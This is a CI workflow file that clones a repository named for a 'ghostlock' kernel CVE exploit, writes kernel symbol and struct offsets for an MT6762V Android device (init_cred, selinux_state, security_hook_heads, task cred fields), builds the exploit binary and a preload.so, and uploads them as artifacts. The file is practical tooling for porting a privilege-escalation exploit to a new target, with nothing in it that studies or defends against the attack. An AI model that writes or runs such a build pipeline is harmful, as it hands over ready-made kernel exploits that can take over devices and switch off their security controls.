name: build_k40_port_for_m36
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y gcc clang make git

      - name: Clone K40 port
        run: |
          git clone https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40.git
          cd ghostlock-cve-2026-43499-4.19-k40

      - name: Patch target.h for M36 (MT6762V)
        run: |
          cd ghostlock-cve-2026-43499-4.19-k40
          
          cat << 'EOF' > src/targets/oplus-4.19.157-perf/target.h
          #pragma once
          #include <stdint.h>

          #define KERNEL_BASE             0xffffff8008080000UL

          // Addresses from MT6762V nm output
          #define INIT_TASK_OFF           0x16fbe40UL   // init_task (ffffff800977b840)
          #define INIT_CRED_OFF           0x1707f48UL   // init_cred (ffffff8009787f48)
          #define SELINUX_STATE_OFF       0x1925fc0UL   // selinux_state (ffffff80099a5fc0)
          #define SECURITY_HOOK_HEADS_OFF 0x14c8288UL   // security_hook_heads (ffffff8009548288)
          #define KMALLOC_CACHES_OFF      0x14c7df0UL   // kmalloc_caches (ffffff8009547df0)
          
          // From our disassembly (commit_creds)
          #define TASK_REAL_CRED_OFF      1880          // 0x758
          #define TASK_CRED_OFF           1888          // 0x760
          #define TASK_COMM_OFF           1896          // 0x768
          
          // Standard 4.19 arm64 offsets
          #define CRED_CAPS_OFF           40
          #define CRED_SECURITY_OFF       120
          #define SELINUX_CRED_BLOB_OFF   0
          
          // Pipe & other structs (standard for 4.19)
          #define PIPE_INODE_INFO_OFF     0
          #define PIPE_BUFFER_OFF         0
          #define CONFIGFS_BUFFER_OFF     0
          #define ASHMEM_MISC_OFF         0
          #define EMPTY_ZERO_PAGE_OFF     0x190e000UL // empty_zero_page (ffffff80098fe000)
          EOF

          echo "=== New target.h created ==="
          cat src/targets/oplus-4.19.157-perf/target.h

      - name: Build the exploit
        run: |
          cd ghostlock-cve-2026-43499-4.19-k40
          make
          
          echo "=== Built files ==="
          find . -name "*.so" -o -name "exploit" -o -name "preload*" | head -n 20
          
          mkdir -p /tmp/out
          find . -name "preload.so" -exec cp {} /tmp/out/ \;
          find . -name "exploit" -exec cp {} /tmp/out/ \;
          
          ls -la /tmp/out/

      - uses: actions/upload-artifact@v4
        with:
          name: ghostlock-k40-port
          path: /tmp/out/
